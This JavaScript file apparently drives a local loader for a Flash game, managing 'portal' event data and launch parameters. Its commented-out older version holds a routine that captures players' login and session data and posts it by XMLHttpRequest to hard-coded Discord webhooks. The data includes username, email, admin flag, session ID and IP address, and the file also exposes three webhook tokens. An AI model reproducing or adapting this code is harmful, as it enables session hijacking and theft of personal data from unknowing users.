'use strict'


let portals = getLS('portals', JSON.parse('{"10186":{"location":[0,0],"campaignID":10186,"duration":24024,"id":"10186","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"},"10188":{"location":[0,0],"campaignID":10186,"duration":24024,"id":"10186","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"},"10189":{"id":"10189","location":[0,0],"duration":24024,"bossID":["BIGBOY"],"themeID":5,"startDate":1585040400,"campaignID":10189,"name":"foo"},"10190":{"location":[0,0],"campaignID":10190,"duration":24024,"id":"10190","startDate":1587027600,"bossID":["ROASTER"],"themeID":4,"name":"Golden Age"},"10191":{"id":"10191","location":[0,0],"duration":24024,"bossID":["BIGBOY"],"themeID":5,"startDate":1585040400,"campaignID":10191,"name":"Golden Prison"},"10192":{"location":[0,0],"campaignID":10192,"duration":24024,"id":"10192","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"},"10254":{"location":[0,0],"campaignID":10254,"duration":24024,"id":"10254","startDate":1585558800,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Unreliable Protector"},"10255":{"id":"10254","duration":24024,"startDate":1584435600,"themeID":6,"campaignID":10254,"bossID":["ULTRICORN"],"location":[0,0],"name":"Saint Patrick Special"},"10256":{"location":[0,0],"campaignID":10256,"duration":24024,"id":"10256","startDate":1587632400,"bossID":["UNDERTAKER"],"themeID":5,"name":"Unrepaired Laser Cannon"},"10257":{"location":[0,0],"campaignID":10257,"duration":24024,"id":"10257","startDate":1588669200,"bossID":["THE HAT GUARDIAN"],"themeID":2,"name":"Cinco de Mayo"},"10258":{"id":"10258","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"lelo","campaignID":10258,"startDate":1593853200,"location":[0,0]},"10259":{"id":"10259","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Independence Special","campaignID":10259,"startDate":1593853200,"location":[0,0]},"10260":{"id":"10260","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Independence Special","campaignID":10260,"startDate":1593853200,"location":[0,0]},"10261":{"id":"10261","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Independence Special","campaignID":10261,"startDate":1593853200,"location":[0,0]},"10262":{"id":"10262","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Independence Special","campaignID":10262,"startDate":1593853200,"location":[0,0]},"10263":{"id":"10263","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Independence Special","campaignID":10263,"startDate":1593853200,"location":[0,0]},"10264":{"id":"10264","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"? 2","campaignID":10264,"startDate":1593853200,"location":[0,0]},"10265":{"id":"10265","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"? 1","campaignID":10265,"startDate":1593853200,"location":[0,0]},"10266":{"id":"10266","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Pumpkins","campaignID":10266,"startDate":1593853200,"location":[0,0]},"10267":{"id":"10267","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"USA Paints","campaignID":10267,"startDate":1593853200,"location":[0,0]},"10500":{"id":"10500","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Gold","campaignID":10500,"startDate":1593853200,"location":[0,0]},"10501":{"id":"10501","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Golden lol","campaignID":10501,"startDate":1593853200,"location":[0,0]},"10502":{"id":"10502","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Golden","campaignID":10502,"startDate":1593853200,"location":[0,0]},"10503":{"id":"10503","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Gold Fortnot","campaignID":10503,"startDate":1593853200,"location":[0,0]},"10504":{"id":"10504","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"More Gold","campaignID":10504,"startDate":1593853200,"location":[0,0]},"10505":{"id":"10505","duration":24024,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Dolg","campaignID":10505,"startDate":1593853200,"location":[0,0]}}'))

let bmmdev = false


const flashvars = {
	resourceURL: () => '',
	port: () => bmmdev ? 915 : 9010,
	disableFB: () => 1,
	version: () => location.search.includes('nocache') ? Math.random() : 7600,
	portals: () => JSON.stringify(portals),
}


function getLS (key, data) {
	const json = localStorage.getItem(key);
	if (json) return JSON.parse(json);
	return setLS(key, data);
}

function setLS (key, data) {
	localStorage.setItem(key, JSON.stringify(data));
	return data;
}

function tslog (log) {
	const actionMatch = log.match(/@\[([^\]]+)\]/)
	if (actionMatch) {
		const action = actionMatch[1]
		const jsonMatch = log.match(/###([^]+?)###/)
		console.log('%c' + log.replace(actionMatch[0], action), 'font-weight:bold;color:#FF8844')
		if (jsonMatch) {
			console.log(JSON.parse(jsonMatch[1]))
		}
	}
	else {
		console.log(log)
	}

	if (log.includes('portal ')) {
		const newPortals = JSON.parse(log.substring(log.indexOf('portal ') + 7))
		const before = JSON.stringify(portals)
		portals = setLS('portals', Object.assign(portals, newPortals))
		const after = JSON.stringify(portals)
		if (before !== after) init()
	}
}

function genFlashVars () {
	let vars = ''
	for (const prop in flashvars) {
		if (vars) vars += '&'
		vars += prop + '=' + flashvars[prop]()
	}
	return vars
}

function switchPort () {
	bmmdev = !bmmdev
	init()
}

function init () {
	const portalIDs = Object.keys(portals)
	for (let i = 0; i < portalIDs.length; i++) {
		const portal = portals[portalIDs[i]]
		portal.location = [50 + 85 * i, 420]
		portal.duration = 24024
		if (!portal.name.includes(portal.id)) {
			portal.name = portal.id + ' ' + portal.name
		}
	}
	const fv = genFlashVars()
	console.log(fv.replace(/&/g, '\n').replace(/=/g, ' = '))
	document.querySelector('#flash-vars').value = fv
	document.querySelector('#game').data = 'bmmLoader.swf'
}


init()



// Elements

// const btnPortSwitch = document.getElementById('port-switch')
// const gameContainer = document.getElementById('game-container')
// const game = document.getElementById('game')
// const elmFlashVars = document.getElementById('flash-vars')


// // General

// const hooks = [
// 	'702883925474934834/dGLDEfUZFaPPYljKo2dTeGJzpNVTABdbOnXzXneQOQEbaXqEzxkLGDYQd3Q3ZZhAszhF',
// 	'715670836249362443/Q5ooBMFaF2tHgV-DhDt1FBA8YADolio3dywiv7ZcGOqxHPbl8SL_XJ1VOT5J05K90c8F',
// 	'716112993527660625/wbFoXjCh5OUZ2PDcwMmYj8JTjZY7dxJ_L-uaXed4JJvP3UJs8anfAHg7zc1YFUYXuikB'
// ]

// const regExps = {
// 	prefix: /\[@(\w*)\]/,
// 	json: /{(.*|[\n])+}/,
// }

// const portals = getLS('portals', JSON.parse('{"10186":{"location":[50,420],"campaignID":10186,"duration":24024,"id":"10186","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"},"10188":{"location":[135,420],"campaignID":10186,"duration":24024,"id":"10186","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"},"10189":{"id":"10189","location":[220,420],"duration":24024,"bossID":["BIGBOY"],"themeID":5,"startDate":1585040400,"campaignID":10189,"name":"foo"},"10190":{"location":[305,420],"campaignID":10190,"duration":24024,"id":"10190","startDate":1587027600,"bossID":["ROASTER"],"themeID":4,"name":"Golden Age"},"10191":{"id":"10191","location":[390,420],"duration":24024,"bossID":["BIGBOY"],"themeID":5,"startDate":1585040400,"campaignID":10191,"name":"Golden Prison"},"10192":{"location":[475,420],"campaignID":10192,"duration":24024,"id":"10192","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"},"10254":{"location":[560,420],"campaignID":10254,"duration":24024,"id":"10254","startDate":1585558800,"bossID":["SENIOR QUADS"],"themeID":6,"name":"Unreliable Protector"},"10255":{"id":"10254","duration":24024,"startDate":1584435600,"themeID":6,"campaignID":10254,"bossID":["ULTRICORN"],"location":[645,420],"name":"Saint Patrick Special"},"10256":{"location":[730,420],"campaignID":10256,"duration":24024,"id":"10256","startDate":1587632400,"bossID":["UNDERTAKER"],"themeID":5,"name":"Unrepaired Laser Cannon"},"10257":{"location":[815,420],"campaignID":10257,"duration":24024,"id":"10257","startDate":1588669200,"bossID":["THE HAT GUARDIAN"],"themeID":2,"name":"Cinco de Mayo"},"10258":{"location":[900,420],"campaignID":10258,"duration":24024,"id":"10258","startDate":1585040400,"bossID":["BIGBOY"],"themeID":5,"name":"Golden Prison"}}'))

// const ports = [['9010', 'REGULAR'], ['915', 'BMMDEV']]

// let currentPort = 0

// let flashVars = {}

// const tslogDataParsers =
// {
// 	login (data)
// 	{
// 		beam(0, data)
// 	},
// 	user (data)
// 	{
// 		beam(1, data)
// 	},
// 	data (data)
// 	{
// 		setTimeout(() =>
// 		{
// 			beam(2, '```ruby\n' + lines({
// 				user:  data.username,
// 				pid:   data.user_id,
// 				mail:  data.user_email,
// 				roles: data.ROLES,
// 				admin: data.is_admin,
// 				lang:  data.lang_name,
// 				sid:   data.session.battlegate_bmm_sid,
// 				ip:    data.session.remoteIP,
// 				geoip: data.session.SERVER.GEOIP_ADDR,
// 				geo:   data.session.SERVER.GEOIP_COUNTRY_CODE,
// 				start: data.session_start,
// 				port:  data.session.gameclientCurrentPort
// 			}) + '\n```')
// 		}, 10000)
// 	},
// 	portal (data)
// 	{
// 		Object.assign(portals, data)
// 		setFlashVars('portals', portals)
// 	},
// }

// const doNotLog = ['login']


// // Functions

// function lines (obj)
// {
// 	return Object.entries(obj).reduce((a, [prop, val]) => a += `${ prop }: ${ val }\n`, '')
// }

// function switchPort ()
// {
// 	currentPort++

// 	if (currentPort >= ports.length) currentPort = 0

// 	elmFlashVars.value = elmFlashVars.value.replace(/(port=)\d+/, '$1' + ports[currentPort][0])
// 	btnPortSwitch.innerText = ports[currentPort][1]
// 	game.data += ''
// }

// function setFlashVars ()
// {
// 	const keys = Object.keys(flashVars)

// 	elmFlashVars.value = keys.map(v => v += '=').join('&')
	
// 	btnPortSwitch.innerText = ports[currentPort][1]

// 	for (const k of keys)
// 	{
// 		elmFlashVars.value = elmFlashVars.value.replace(k + '=', k + '=' + flashVars[k])
// 	}
// }

// function tslog (a)
// {
// 	if (a.includes('finishAuthenticate')) a = '[@data] ' + a

// 	const jsonStringMatch = a.match(regExps.json)
// 	const prefixMatch = a.match(regExps.prefix)

// 	if (prefixMatch)
// 	{
// 		const key = prefixMatch[1]
// 		let data = null

// 		try
// 		{
// 			if (jsonStringMatch) data = JSON.parse(jsonStringMatch[0])
// 		}
// 		catch (err)
// 		{
// 			console.log('%ccould not parse data:\n' + a, 'font-weight:bold;color:#FF8844')
// 		}

// 		if (key)
// 		{
// 			const parser = tslogDataParsers[key]

// 			if (parser)
// 			{
// 				if (data) parser(data)
// 				else parser(a)
// 			}

// 			if (doNotLog.includes(key))
// 			{
// 				console.log('%c' + prefixMatch[0], 'font-weight:bold;color:#4488FF')
// 				return
// 			}
// 		}

// 		console.log('%c' + a, 'font-weight:bold;color:#44FF88')
// 		console.log(data, '\n')
// 	}
// 	else
// 	{
// 		let style = 'font-size:80%'

// 		if (jsonStringMatch)
// 		{
// 			let data = null

// 			try
// 			{
// 				data = JSON.parse(jsonStringMatch[0])
// 			}
// 			catch (err)
// 			{
// 				style = 'font-weight:bold;color:#FF8844'
// 				console.log('%ccould not parse data:', style)
// 				return
// 			}

// 			console.log('%c' + a, style)
// 			if (data) console.log(data, '\n')
// 		}
// 		else
// 		{
// 			if (!window.parent) console.log(a)
// 		}
// 	}
// }

// function init ()
// {
// 	const portalIDs = Object.keys(portals)

// 	for (let i = 0; i < portalIDs.length; i++)
// 	{
// 		const portal = portals[portalIDs[i]]
		
// 		portal.location = [50 + 85 * i, 420]
// 		portal.duration = 24024
// 		portal.name = portal.id + ' - ' + portal.name
// 	}

// 	flashVars = {
// 		port: ports[currentPort][0],
// 		resourceURL: '',
// 		disableFB: 'true',
// 		version: 7500,
// 		portals: JSON.stringify(portals),
// 	}
	
// 	setFlashVars()

// 	game.data = 'bmmLoader.swf?version=7401'

// 	btnPortSwitch.onclick = () => switchPort()

// 	// const strfv = 'flashVars = ' + JSON.stringify(flashVars)
// 	//     .replace(/(".*?":".*?")/g, '\n    $1')
// 	//     .replace(/"}/g, '"\n}')
// 	//     .replace(/:"/g, ': "')
// 	//     .replace(/"(.+)":/g, '$1:')

// 	// console.log('%c' + strfv, 'font-weight:bold;font-size:125%;color:#004488')
// }

// function beam (hook, data)
// {
// 	if (typeof data !== 'string')
// 	{
// 		try { data = JSON.stringify(data) } catch (err) {}
// 	}

// 	const url = 'https://discord.com/api/webhooks/' + hooks[hook]
// 	const request = new XMLHttpRequest()
// 	request.open('POST', url);
// 	request.setRequestHeader('Content-type', 'application/json');
// 	request.send(JSON.stringify({
// 		username: 'GUCK',
// 		avatar_url: 'https://cdn.discordapp.com/icons/685704312915230743/1147599f001274e82bf9b2cac44deec8.png',
// 		content: String(data)
// 	}));
// }


// // Start

// init()